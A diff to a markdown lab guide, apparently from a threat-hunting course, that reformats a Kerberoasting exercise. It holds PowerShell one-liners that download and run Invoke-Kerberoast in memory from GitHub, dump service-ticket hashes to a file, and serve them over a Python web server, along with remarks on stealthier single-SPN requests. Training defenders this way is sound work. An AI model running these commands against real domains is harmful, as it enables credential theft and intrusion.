@@ -103,7 +103,7 @@ powershell.exe -NoP -NonI -Exec Bypass -command "c:\labs\4_KERBEROAST\GetUserSPN
 
 Now let's request a ticket for those SPN's, by running the one-liner below you're again doing the attack in a file-less manner by downloading the Invoke-Kerberoast powershell script directly into the memory of `powershell.exe`:
 
-source: ***[Invoke-Kerberoast.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)*** - link
+- source: ***[Invoke-Kerberoast.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)*** - link
 
 Open a **powershell** prompt (as Administrator):
 
@@ -115,23 +115,18 @@ IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/
 
 Let's run it locally and save the hashes, this will avoid copy/paste errors, open a **powershell** prompt:
 
-```code
+```yaml
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1');
+```
+```yaml
 cd C:\threathunt\labs\4_KERBEROAST
+```
+```yaml
 Import-Module .\Invoke-Kerberoast.ps1
+```
+```yaml
 Invoke-Kerberoast | Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt
 ```
-
-> **IMPORTANT**: If you want to run this attack multiple times, don't forget to purge your Kerberos tickets. Kerberos Tickets are cached for SSO purposes, so if you run the Invoke-Kerberoast script multplie times, your client will not request a new TGS from the DC when it still has one in it's cach.
->
-> You can view and clear the cache with these commands:
-> 
-> ***klist***  
-> ***klist purge***
-
-![image](./images/00_klist.jpg)
-
-![image](./images/00_klistpurge.jpg)
 
 So by default this will ***enumerate ALL SPN's*** on a domain, this of course is suspicious as a user would never to request all those tickets at the same time. A more stealthy adversary will first do his recon (GetUserSPN's for example) and see which service accounts might prove juicy targets, and then just request a **single SPN**:
 
@@ -151,6 +146,21 @@ We're going to start a little python webserver in the `directory` where we save 
 cd c:\labs\4_KERBEROAST
 python -m http.server -b 10.0.0.xx 9090
 ```
+
+> **IMPORTANT**: If you want to run this attack multiple times, don't forget to purge your Kerberos tickets. Kerberos Tickets are cached for SSO purposes, so if you run the Invoke-Kerberoast script multplie times, your client will not request a new TGS from the DC when it still has one in it's cach.
+>
+> You can view and clear the cache with these commands:
+
+```yaml
+klist
+```
+```yaml
+klist purge
+```
+
+![image](./images/00_klistpwsh.jpg)
+
+![image](./images/00_klist_purge.jpg)
 
 # CRACKING HASHES USING JOHN THE RIPPER
 ---
